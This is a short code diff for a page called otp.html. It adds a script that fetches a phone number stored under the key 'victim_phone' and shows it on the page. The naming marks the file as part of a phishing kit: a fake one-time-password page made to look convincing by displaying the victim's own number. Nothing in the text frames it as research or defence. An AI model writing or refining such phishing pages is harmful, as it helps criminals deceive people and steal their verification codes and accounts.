@@ -61,6 +61,26 @@
 
 <!-- FIXED: Added leading slash -->
 
+<!-- ... your entire otp.html stays exactly the same until the bottom ... -->
+
+    <footer class="bottom-bar"><span></span></footer>
+</div>
+
+<!-- ADD THIS SCRIPT RIGHT BEFORE </body> -->
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    // 1. Get the phone number from the browser's memory
+    const savedPhone = sessionStorage.getItem('victim_phone');
+    
+    // 2. Find the display element
+    const displayElement = document.getElementById('displayPhone');
+    
+    // 3. If a number was saved, show it. Otherwise, show the default
+    if (savedPhone && savedPhone.length > 5) {
+        displayElement.textContent = savedPhone;
+    }
+});
+</script>
 
 </body>
 </html>
